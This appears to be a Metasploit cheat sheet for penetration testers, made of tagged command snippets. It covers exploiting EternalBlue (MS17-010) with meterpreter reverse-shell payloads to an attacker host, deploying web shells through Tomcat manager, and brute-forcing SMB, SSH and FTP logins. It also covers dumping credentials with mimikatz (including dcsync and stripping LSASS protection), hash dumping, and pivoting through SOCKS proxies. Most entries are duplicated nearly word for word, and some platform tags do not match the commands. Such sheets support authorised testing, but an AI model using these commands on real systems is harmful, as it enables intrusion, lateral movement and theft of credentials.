# MSF

% metasploit

## upgrade session to meterpreter (32-bit)
#plateform/linux #target/remote #cat/ATTACK/CONNECT  
```
sessions -u <session_id>
```

## upgrade session to meterpreter (64-bit)
#plateform/linux #target/remote #cat/ATTACK/CONNECT  
```
sessions -u <session_id>
```

## show session list
#plateform/linux #target/remote #cat/ATTACK/CONNECT
```
sessions -l
```

## print route table
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
```
route print
```

## add pivot (autoroute)
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
example : 
use multi/manage/autoroute
set session 1
exploit
```
use multi/manage/autoroute
```

## add socks proxy (autoroute first)
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 

example : 
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j

```
use auxiliary/server/socks_proxy
```

## load kiwi (mimikatz) - 32-bit session
#plateform/linux #target/local #cat/PRIVESC  
```
load kiwi
```

## load kiwi (mimikatz) - 64-bit session
#plateform/linux #target/local #cat/PRIVESC  
```
load kiwi
```

## kiwi - credential dump (mimikatz)
#plateform/linux #target/local #cat/PRIVESC  
```
creds_all
```

## kiwi - logonpasswords (mimikatz)
#plateform/linux #target/local #cat/PRIVESC  
```
lsa_dump_sam
lsa_dump_secrets
```

## kiwi - dcsync (mimikatz)
#plateform/linux #target/local #cat/PRIVESC  
```
dcsync <domain_controller_name>
```

## create process (32-bit)
#plateform/linux #target/local #cat/UTILS 
```
execute -H -f <process|notepad>
```

## create process (64-bit)
#plateform/linux #target/local #cat/UTILS 
```
execute -H -f <process|notepad>
```

## migrate to 32-bit process
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
migrate -N <process_name|notepad.exe>
```

## migrate to 64-bit process
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
migrate -N <process_name|notepad.exe>
```

##  PPL remove (32-bit)
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
load kiwi
kiwi_cmd "!processprotect /process:lsass.exe /remove"
creds_all
```

##  PPL remove (64-bit)
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
load kiwi
kiwi_cmd "!processprotect /process:lsass.exe /remove"
creds_all
```

## enum LAPS
#plateform/linux #target/local #cat/ATTACK
```
use post/windows/gather/laps
```

## Windows EternalBlue (MS17-010) - 32-bit
#plateform/linux #target/remote #cat/EXPLOIT
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <rhost>
set payload windows/meterpreter/reverse_tcp
set LHOST <lhost>
set LPORT <lport>
exploit
```

## Windows EternalBlue (MS17-010) - 64-bit
#plateform/linux #target/remote #cat/EXPLOIT
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <rhost>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <lhost>
set LPORT <lport>
exploit
```

## Windows SMB Login - 32-bit
#plateform/linux #target/remote #cat/BRUTE_FORCE
```
use auxiliary/scanner/smb/smb_login
set RHOSTS <rhost>
set USER_FILE <users.txt>
set PASS_FILE <passwords.txt>
run
```

## Windows SMB Login - 64-bit
#plateform/linux #target/remote #cat/BRUTE_FORCE
```
use auxiliary/scanner/smb/smb_login
set RHOSTS <rhost>
set USER_FILE <users.txt>
set PASS_FILE <passwords.txt>
run
```

## SSH Login - 32-bit
#plateform/linux #target/remote #cat/BRUTE_FORCE
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <rhost>
set USER_FILE <users.txt>
set PASS_FILE <passwords.txt>
run
```

## SSH Login - 64-bit
#plateform/linux #target/remote #cat/BRUTE_FORCE
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <rhost>
set USER_FILE <users.txt>
set PASS_FILE <passwords.txt>
run
```

## FTP Login - 32-bit
#plateform/linux #target/remote #cat/BRUTE_FORCE
```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <rhost>
set USER_FILE <users.txt>
set PASS_FILE <passwords.txt>
run
```

## FTP Login - 64-bit
#plateform/linux #target/remote #cat/BRUTE_FORCE
```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <rhost>
set USER_FILE <users.txt>
set PASS_FILE <passwords.txt>
run
```

## Web Shell Upload - 32-bit
#plateform/linux #target/remote #cat/EXPLOIT
```
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS <rhost>
set RPORT <rport>
set USERNAME <user>
set PASSWORD <password>
set payload windows/meterpreter/reverse_tcp
set LHOST <lhost>
set LPORT <lport>
exploit
```

## Web Shell Upload - 64-bit
#plateform/linux #target/remote #cat/EXPLOIT
```
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS <rhost>
set RPORT <rport>
set USERNAME <user>
set PASSWORD <password>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <lhost>
set LPORT <lport>
exploit
```

## Post Exploitation - Hashdump (32-bit)
#plateform/linux #target/local #cat/PRIVESC
```
use post/windows/gather/hashdump
set SESSION <session_id>
run
```

## Post Exploitation - Hashdump (64-bit)
#plateform/linux #target/local #cat/PRIVESC
```
use post/windows/gather/hashdump
set SESSION <session_id>
run
```

## Post Exploitation - Credentials (32-bit)
#plateform/linux #target/local #cat/PRIVESC
```
use post/windows/gather/credentials/credential_collector
set SESSION <session_id>
run
```

## Post Exploitation - Credentials (64-bit)
#plateform/linux #target/local #cat/PRIVESC
```
use post/windows/gather/credentials/credential_collector
set SESSION <session_id>
run
```

